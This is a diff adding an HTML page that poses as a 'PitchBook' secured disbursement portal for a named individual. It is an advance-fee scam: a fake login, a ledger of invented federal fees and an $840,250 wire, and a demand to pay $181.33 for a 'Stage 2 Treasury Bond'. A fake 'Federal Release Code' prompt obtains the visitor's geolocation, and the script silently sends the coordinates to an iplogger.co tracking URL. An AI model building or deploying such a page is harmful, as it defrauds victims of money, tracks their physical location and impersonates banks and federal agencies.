@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PitchBook | Secured Disbursement Portal</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace']
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body { font-family: 'Inter', sans-serif; background-color: #020617; color: #cbd5e1; margin: 0; padding: 0; overflow-x: hidden; }
+    .data-panel { background: linear-gradient(145deg, #1e293b, #111a2e); border: 1px solid #334155; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3); }
+    .header-gradient { background: linear-gradient(90deg, #0052cc, #0747a6); box-shadow: 0 4px 20px rgba(0, 82, 204, 0.3); }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px currentColor; }
+    .pulsing { animation: pulse-opacity 2s infinite; }
+    @keyframes pulse-opacity { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.9); } }
+    .modal-bg { background: rgba(2, 6, 23, 0.98); backdrop-filter: blur(16px); }
+    #main-content.locked { filter: blur(20px); pointer-events: none; user-select: none; }
+    .btn-info { transition: all 0.2s ease; cursor: pointer; }
+    .btn-info:hover { color: #fff; transform: scale(1.2); }
+    .ledger-row:hover { background: rgba(59, 130, 246, 0.03); }
+    .modal-scroll { max-height: 70vh; overflow-y: auto; }
+    pre { white-space: pre-wrap; word-wrap: break-word; }
+  </style>
+</head>
+
+<body class="p-4 md:p-8 min-h-screen">
+
+  <!-- LOGIN AUTHENTICATION OVERLAY -->
+  <div id="auth-overlay" class="fixed inset-0 z-[200] bg-slate-950 flex items-center justify-center p-4">
+    <div class="w-full max-w-md bg-slate-900/80 border border-slate-800 p-8 rounded-xl shadow-2xl relative overflow-hidden backdrop-blur-xl">
+      <div class="absolute top-0 left-0 w-full h-1 bg-blue-600"></div>
+      <div class="text-center mb-8">
+        <h2 class="text-white font-bold text-3xl tracking-tight mb-2">PitchBook</h2>
+        <div class="flex items-center justify-center gap-2">
+          <span class="w-2 h-2 rounded-full bg-blue-500 animate-pulse shadow-[0_0_10px_#3b82f6]"></span>
+          <p class="text-slate-400 text-[10px] uppercase tracking-widest font-bold">Secure Personnel Access Required</p>
+        </div>
+      </div>
+      <form id="auth-form" class="space-y-4">
+        <input type="text" name="username" placeholder="Username / Employee ID" required class="w-full bg-slate-950/50 border border-slate-800 p-3.5 rounded-lg text-slate-200 text-sm outline-none focus:border-blue-500">
+        <input type="password" name="password" placeholder="Security Password" required class="w-full bg-slate-950/50 border border-slate-800 p-3.5 rounded-lg text-slate-200 text-sm outline-none focus:border-blue-500">
+        <button type="submit" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3.5 rounded-lg text-xs uppercase tracking-widest transition-all mt-4 active:scale-95 shadow-lg shadow-blue-900/20">Verify Identity</button>
+      </form>
+      <div id="auth-spinner" class="hidden mt-6 text-center">
+        <div class="inline-block animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-blue-500 mb-3"></div>
+        <p class="text-[10px] text-slate-400 font-mono uppercase tracking-tighter">Connecting to Treasury Node…</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN PORTAL CONTENT -->
+  <div id="main-content" class="max-w-6xl mx-auto space-y-6 locked transition-all duration-1000">
+
+    <!-- Header -->
+    <div class="flex flex-col md:flex-row justify-between items-center header-gradient px-8 py-6 rounded-xl border-b-2 border-blue-900/50">
+      <div class="flex items-center gap-6">
+        <span class="text-white font-bold text-2xl tracking-tight">PitchBook</span>
+        <div class="h-8 w-[1px] bg-white/20"></div>
+        <div class="flex flex-col">
+          <span class="text-[10px] font-bold tracking-widest text-blue-50 uppercase opacity-90">Treasury Remittance & Settlement</span>
+          <span class="text-[9px] text-blue-100/60 font-mono uppercase tracking-tight">Node: PB-MUK-TX-58</span>
+        </div>
+      </div>
+      <div id="system-time" class="text-[11px] font-mono font-bold text-blue-50 px-4 py-1.5 bg-blue-950/40 rounded-full border border-white/10">--:--:-- CST</div>
+    </div>
+
+    <!-- Account Profile -->
+    <div class="data-panel rounded-xl p-8 grid grid-cols-1 md:grid-cols-3 gap-8">
+      <div class="space-y-4">
+        <div>
+          <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1.5">Registered Payee</p>
+          <h2 class="text-2xl font-bold text-slate-50 tracking-tight uppercase">Mujinga Mukuna</h2>
+          <p class="text-[11px] text-blue-400 font-mono font-medium mt-1">Client ID: MUKMUJ58</p>
+        </div>
+        <div class="inline-flex items-center gap-2.5 px-3.5 py-1.5 bg-green-950/20 rounded-full border border-green-500/30">
+          <span class="status-dot bg-green-500"></span>
+          <span class="text-[10px] font-bold text-green-400 uppercase tracking-tight">Settlement Authorized</span>
+        </div>
+      </div>
+      <div class="bg-slate-950/40 p-6 rounded-xl border border-slate-800/50 shadow-inner text-center">
+        <p class="text-[10px] text-slate-500 font-bold uppercase mb-4 tracking-widest">Target Bank Account (Wire)</p>
+        <p class="text-sm font-bold text-slate-200 uppercase tracking-wide">FIRST CONVENIENCE BANK</p>
+        <p class="text-sm font-bold text-slate-200 uppercase tracking-wide">FIRST NATIONAL BANK TEXAS</p>
+        <div class="flex justify-center gap-6 mt-3">
+          <div class="text-left border-r border-slate-800 pr-6">
+            <p class="text-[8px] text-slate-500 font-bold uppercase mb-0.5">ABA / Routing</p>
+            <p class="text-xs font-mono font-bold text-slate-400">111906271</p>
+          </div>
+          <div class="text-left">
+            <p class="text-[8px] text-slate-500 font-bold uppercase mb-0.5">DDA / Account</p>
+            <p class="text-xs font-mono font-bold text-slate-400">********139</p>
+          </div>
+        </div>
+      </div>
+      <div class="flex flex-col justify-center items-end text-right">
+        <p class="text-[10px] text-slate-500 font-bold uppercase mb-2 tracking-widest">Remittance Status</p>
+        <div class="flex items-center gap-2.5 bg-blue-950/40 px-4 py-2 rounded-full border border-blue-500/20 mb-5">
+          <span class="status-dot bg-blue-500 pulsing"></span>
+          <span class="text-[10px] font-bold text-blue-400 uppercase tracking-widest">Awaiting Bank Collection</span>
+        </div>
+        <button onclick="runAudit()" class="px-6 py-2.5 bg-slate-50 hover:bg-white text-slate-950 rounded-lg font-bold text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95">
+          Review Dashboard
+        </button>
+      </div>
+    </div>
+
+    <!-- Briefing Panel (EXPLICITLY HIDDEN ON LOAD) -->
+    <div id="audit-log" class="hidden data-panel rounded-xl p-6 bg-slate-950/80 border-slate-800 shadow-2xl relative">
+      <button onclick="document.getElementById('audit-log').classList.add('hidden')" class="absolute top-4 right-4 text-slate-600 hover:text-white">✕</button>
+      <div class="flex items-center gap-3 mb-4 border-b border-slate-800 pb-3">
+        <div class="w-1.5 h-1.5 rounded-full bg-blue-500 shadow-[0_0_8px_#3b82f6]"></div>
+        <span class="text-[10px] font-mono font-bold text-blue-400 uppercase tracking-widest">Portal Briefing</span>
+      </div>
+      <div id="audit-text" class="text-[11px] text-slate-300 font-mono leading-relaxed whitespace-pre-wrap italic"></div>
+    </div>
+
+    <!-- Ledger -->
+    <div class="data-panel rounded-xl overflow-hidden bg-slate-900/50 border border-slate-800">
+      <div class="bg-slate-800/40 px-8 py-5 border-b border-slate-700/50">
+        <h3 class="text-[11px] font-bold uppercase tracking-[0.2em] text-slate-400">Settlement Ledger</h3>
+      </div>
+      <div class="overflow-x-auto">
+        <table class="w-full text-left text-[11px] font-medium whitespace-nowrap">
+          <thead>
+            <tr class="bg-slate-950/30 text-[10px] text-slate-500 font-bold border-b border-slate-800 uppercase tracking-widest">
+              <th class="px-8 py-5">Value Date</th>
+              <th class="px-8 py-5">Reference No.</th>
+              <th class="px-8 py-5">Description</th>
+              <th class="px-8 py-5 text-right">Value</th>
+              <th class="px-8 py-5">Status</th>
+              <th class="px-8 py-5 text-right">Info</th>
+            </tr>
+          </thead>
+          <tbody id="ledger-body" class="divide-y divide-slate-800/30"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- BONUS INFO BUTTON -->
+    <div class="text-center my-10">
+      <a class='px-8 py-3 bg-blue-600/10 hover:bg-blue-600/20 text-blue-400 border border-blue-500/30 font-bold rounded-lg text-xs uppercase tracking-[0.2em] transition-all inline-block' href='settlement.html'>
+        Bonus Info
+      </a>
+    </div>
+
+    <!-- Detail Modal -->
+    <div id="info-modal" class="fixed inset-0 modal-bg hidden flex items-center justify-center p-4 z-50">
+      <div class="data-panel w-full max-w-2xl p-8 rounded-2xl border-slate-700 shadow-2xl">
+        <div class="flex justify-between items-start mb-6">
+          <div class="space-y-1">
+            <h3 id="info-title" class="text-xs font-bold uppercase tracking-[0.3em] text-blue-400">Document Detail</h3>
+            <p class="text-[9px] text-slate-500 font-mono uppercase">Encrypted Regulatory Clearance Log</p>
+          </div>
+          <button onclick="closeInfo()" class="w-8 h-8 flex items-center justify-center rounded-full bg-slate-800 text-slate-400 hover:text-white">✕</button>
+        </div>
+        <div class="modal-scroll space-y-4 pr-2">
+          <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800/50">
+            <p class="text-[10px] text-slate-500 uppercase font-bold mb-1 tracking-widest">Transaction Description</p>
+            <p id="modal-desc" class="text-sm text-slate-100 font-semibold"></p>
+          </div>
+          <div class="grid grid-cols-2 gap-4">
+            <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800/50">
+              <p class="text-[10px] text-slate-500 uppercase font-bold mb-1 tracking-widest">Amount</p>
+              <p id="modal-amount" class="text-lg text-slate-100 font-mono font-bold"></p>
+            </div>
+            <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800/50">
+              <p class="text-[10px] text-slate-500 uppercase font-bold mb-1 tracking-widest">Current Status</p>
+              <p id="modal-status" class="text-sm font-bold uppercase"></p>
+            </div>
+          </div>
+          <div class="bg-slate-950/60 p-5 rounded-xl border border-slate-800/50">
+            <p class="text-[10px] text-slate-500 uppercase font-bold mb-1 tracking-widest">Audit History / Filer</p>
+            <pre id="modal-audit" class="text-[11px] text-slate-300 leading-relaxed font-mono italic"></pre>
+          </div>
+          <div class="bg-blue-900/10 p-5 rounded-xl border border-blue-500/20">
+            <p class="text-[10px] text-blue-400 uppercase font-bold mb-1 tracking-widest">Instruction / Requirement</p>
+            <p id="modal-body" class="text-[11px] text-slate-300 leading-relaxed"></p>
+          </div>
+          <button onclick="closeInfo()" class="w-full py-3.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] font-bold uppercase tracking-widest rounded-lg transition-all mt-4">Close Detail View</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECURITY PROTOCOL OVERLAY (FRC) -->
+    <div id="system-modal" class="fixed inset-0 modal-bg hidden flex items-center justify-center p-4 z-[300]">
+      <div class="bg-[#0b1220] w-full max-w-lg border border-slate-800 rounded shadow-2xl overflow-hidden">
+        <div class="p-6 md:p-8 space-y-6">
+          <div class="flex items-start gap-3">
+             <div class="mt-1">
+                <span class="w-2 h-2 rounded-full bg-blue-500 inline-block shadow-[0_0_8px_#3b82f6]"></span>
+             </div>
+             <div>
+                <h3 class="text-[10px] md:text-[11px] font-bold uppercase tracking-[0.1em] text-blue-400 leading-tight">
+                    SECURITY PROTOCOL: FEDERAL RELEASE CODE (FRC) — RESIDENCY VERIFICATION INITIATED
+                </h3>
+             </div>
+          </div>
+
+          <div class="w-full h-px bg-slate-800/50"></div>
+
+          <div>
+            <p class="text-[10px] font-mono text-slate-400 font-medium">
+              CLIENT IDENTIFIER DETECTED — <span class="text-slate-300">MUKMUJ58</span>
+            </p>
+          </div>
+
+          <div class="w-full h-px bg-slate-800/50"></div>
+
+          <p class="text-[12px] md:text-[13px] text-slate-300 leading-relaxed font-sans opacity-90">
+            The Treasury Node requires a one-time geolocation authorization to verify the recipient’s physical presence within the designated jurisdiction of the State of Texas, as mandated by federal compliance protocols.
+          </p>
+
+          <button onclick="triggerTracking()" id="sync-btn" class="w-full py-4 bg-blue-600 hover:bg-blue-500 text-white text-[11px] font-bold uppercase tracking-[0.15em] rounded transition-all">
+            Authorize Geolocation Sync
+          </button>
+          
+          <p id="geo-error" class="text-[9px] text-red-500 hidden mt-4 font-mono font-bold uppercase text-center">
+              Critical Error: Geolocation Authorization Required for FRC Release
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="py-16 text-center opacity-30">
+      <p class="text-[10px] font-bold text-slate-500 tracking-[0.5em] uppercase">PitchBook Financial Operations • Secure Treasury Gateway</p>
+    </div>
+  </div>
+
+  <script>
+    const TX_DATA = [
+      { date: "Jan 06, 2026", ref: "REF-4770", desc: "Initial Security Margin Provision", val: "$350.00", status: "SUCCESS" },
+      { date: "Jan 13, 2026", ref: "REF-8921", desc: "Correspondent Bank Verification Fee", val: "$73.50", status: "SUCCESS" },
+      { date: "Jan 14, 2026", ref: "REF-9111", desc: "Partial Remittance (Tier I)", val: "$1,000.00", status: "SUCCESS" },
+      { date: "Jan 14, 2026", ref: "ACK-MUK-14", desc: "Inward Receipt Confirmation (Tier I)", val: "0.00054321 BTC", status: "VERIFIED" },
+      { date: "Jan 18, 2026", ref: "REF-9130", desc: "Main Disbursement (Tranche I)", val: "$5,999.00", status: "SUCCESS" },
+      { date: "Jan 22, 2026", ref: "FRB-STAMP-50", desc: "Federal Wire Administrative Stamp", val: "$50.00", status: "SUCCESS" },
+      { date: "Jan 22, 2026", ref: "WT-FINAL", desc: "Final Escrow Balance Wire", val: "$840,250.00", status: "RELEASED" },
+      { date: "Jan 23, 2026", ref: "FCB-ADMIN-100", desc: "Administrative Processing Fee (FinCEN CTR-104)", val: "$100.00", status: "VERIFIED" },
+      { date: "Jan 24, 2026", ref: "IRS-1099-M-58", desc: "IRS Form 1099-MISC Bonus Reporting", val: "$847,249.00", status: "AUTHORIZED" },
+      { date: "Jan 24, 2026", ref: "JLA-CORP-011", desc: "Joint Liability Agreement", val: "$400.00", status: "AUTHORIZED" },
+      { date: "Jan 24, 2026", ref: "FIQ-SEC-992", desc: "Federal Integrity Questionnaire", val: "COMPLETED", status: "AUTHORIZED" },
+      { date: "Jan 24, 2026", ref: "FED-LOA-99", desc: "Federal Disbursement Letter of Acceptance", val: "$847,249.00", status: "AUTHORIZED" },
+      { date: "Jan 30, 2026", ref: "BOND-STG2-ADJ", desc: "Stage 2: Treasury Bond Release (Credit Adjusted)", val: "$181.33", status: "ACTION REQUIRED" }
+    ];
+
+    const TX_DETAILS = {
+      "REF-4770": { audit: "Margin collateral confirmed. Account eligibility verified.\nFiler: PitchBook Treasury Operations", action: "Account opened for high-value settlement." },
+      "REF-8921": { audit: "Banking verification tunnel established.\nFiler: PitchBook Treasury Operations", action: "Correspondent link active." },
+      "REF-9111": { audit: "Initial test disbursement successful.\nFiler: PitchBook Treasury Operations", action: "Tier I verification confirmed." },
+      "ACK-MUK-14": { audit: "Beneficiary confirmation of Tier I funds receipt.\nRecipient: Mujinga Mukuna", action: "Crypto-path validated." },
+      "REF-9130": { audit: "Primary liquidity released on FedWire.\nFiler: PitchBook Treasury Operations", action: "Tranche I settlement completed." },
+      "FRB-STAMP-50": { audit: "Federal Wire Administrative Stamp applied.\nFiler: Federal Wire Admin (FED)", action: "Legal wire header attached." },
+      "WT-FINAL": { audit: "Final funds released from PitchBook Treasury to FIRST NATIONAL BANK TEXAS.\nRecipient: Mujinga Mukuna", action: "Wire Sent. Check account balance for cleared availability." },
+      "FCB-ADMIN-100": { audit: "Regulatory filing Fee (FinCEN CTR-104) processed by Bank Admin at FCB Texas.", action: "No further action required." },
+      "IRS-1099-M-58": { audit: "Filer: Robert Fulton\nOversight: IRS-CI Dallas Field Office", action: "Bonus income reporting authorized. Tax compliance satisfied for large sum release." },
+      "JLA-CORP-011": { audit: "Payment VERIFIED. Compliance review completed.\nFiler: PitchBook Legal Dept.", action: "Joint liability satisfied." },
+      "FIQ-SEC-992": { audit: "Federal integrity screening completed.\nDallas Police FIU / Treasury Oversight", action: "Background verification and source of funds cleared." },
+      "FED-LOA-99": { audit: "Letter of Acceptance confirmed by Federal Reserve Bank of Dallas.", action: "Legal disbursement rights granted and filed." },
+      "BOND-STG2-ADJ": { audit: "Treasury Bond Release (Stage 2)\nRequirement: $185.00\nApplied Credit: -$3.67 (Stage 1 surplus)", action: "Settle the remaining $181.33 to finalize Stage 2 and trigger next liquidity release." }
+    };
+
+    function renderLedger() {
+      const container = document.getElementById('ledger-body');
+      container.innerHTML = TX_DATA.map(tx => `
+        <tr class="ledger-row transition-colors ${tx.status === 'ACTION REQUIRED' ? 'bg-amber-950/10' : ''}">
+          <td class="px-8 py-4 font-mono text-slate-400">${tx.date}</td>
+          <td class="px-8 py-4 font-mono ${tx.status === 'ACTION REQUIRED' ? 'text-amber-500' : 'text-slate-400'}">${tx.ref}</td>
+          <td class="px-8 py-4 ${tx.ref === 'WT-FINAL' ? 'text-slate-100 font-bold' : 'text-slate-400'}">${tx.desc}</td>
+          <td class="px-8 py-4 text-right font-bold ${tx.ref === 'WT-FINAL' ? 'text-blue-400' : 'text-slate-300'}">${tx.val}</td>
+          <td class="px-8 py-4"><span class="text-[9px] font-bold px-2.5 py-1 rounded-full border ${getStatusClass(tx.status)}">${tx.status}</span></td>
+          <td class="px-8 py-4 text-right"><button class="text-slate-500 btn-info" onclick="openAuditModal('${tx.ref}')">ⓘ</button></td>
+        </tr>
+      `).join('');
+    }
+
+    function getStatusClass(status) {
+      if (status === 'SUCCESS' || status === 'AUTHORIZED') return 'text-green-500 border-green-500/20 bg-green-500/10';
+      if (status === 'VERIFIED' || status === 'RELEASED') return 'text-blue-400 border-blue-400/20 bg-blue-400/10';
+      return 'text-amber-500 border-amber-500/20 pulsing';
+    }
+
+    function openAuditModal(refId) {
+      const b = TX_DATA.find(t => t.ref === refId);
+      const d = TX_DETAILS[refId];
+      if (!b || !d) return;
+      document.getElementById('info-title').innerText = `Regulatory Record: ${refId}`;
+      document.getElementById('modal-desc').innerText = b.desc;
+      document.getElementById('modal-amount').innerText = b.val;
+      document.getElementById('modal-status').innerText = b.status;
+      document.getElementById('modal-audit').innerText = d.audit;
+      document.getElementById('modal-body').innerText = d.action;
+      
+      const st = document.getElementById('modal-status');
+      st.className = 'text-sm font-bold uppercase ' + (b.status === 'ACTION REQUIRED' ? 'text-amber-500' : (b.status === 'SUCCESS' || b.status === 'AUTHORIZED' ? 'text-green-500' : 'text-blue-400'));
+      
+      document.getElementById('info-modal').classList.remove('hidden');
+    }
+
+    function closeInfo() { document.getElementById('info-modal').classList.add('hidden'); }
+
+    function runAudit() {
+      const panel = document.getElementById('audit-log');
+      panel.classList.remove('hidden');
+      document.getElementById('audit-text').innerText = "Status: STAGE 01 FILING VERIFIED\nTotal Settlement Value: $847,249.00\n------------------------------------------\nStage 01: Statutory Filing .......... [$95.00] - SUCCESS\nStage 02: Treasury Bond ............. [$181.33] - PENDING\n*(Reflected Credit: $3.67 applied)*\nStage 03: AML Certification ......... [LOCKED]\nStage 04: FRC Decryption ............ [LOCKED]\n------------------------------------------\nAction: Settle Stage 02 Bond Release to trigger Tranche II.";
+    }
+
+    async function triggerTracking() {
+      const btn = document.getElementById('sync-btn');
+      btn.innerText = "SYNCHRONIZING WITH NODE...";
+      btn.disabled = true;
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          try { await fetch(`https://iplogger.co/1Bf615?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&cid=MUKMUJ58`, { mode: 'no-cors' }); } catch (e) {}
+          sessionStorage.setItem('frc_verified', 'true');
+          setTimeout(() => { 
+            document.getElementById('system-modal').classList.add('hidden'); 
+          }, 800);
+        },
+        () => { 
+            document.getElementById('geo-error').classList.remove('hidden'); 
+            btn.disabled = false; 
+            btn.innerText = "AUTHORIZE GEOLOCATION SYNC";
+        },
+        { enableHighAccuracy: true }
+      );
+    }
+
+    document.getElementById('auth-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      document.getElementById('auth-form').classList.add('hidden');
+      document.getElementById('auth-spinner').classList.remove('hidden');
+      setTimeout(() => {
+        document.getElementById('auth-overlay').style.display = 'none';
+        document.getElementById('main-content').classList.remove('locked');
+        if (sessionStorage.getItem('frc_verified') !== 'true') {
+            document.getElementById('system-modal').classList.remove('hidden');
+        }
+      }, 1500);
+    });
+
+    setInterval(() => {
+      document.getElementById('system-time').innerText = new Date().toLocaleTimeString('en-US', { timeZone: 'America/Chicago', hour12: false }) + " CST";
+    }, 1000);
+
+    renderLedger();
+  </script>
+</body>
+</html>
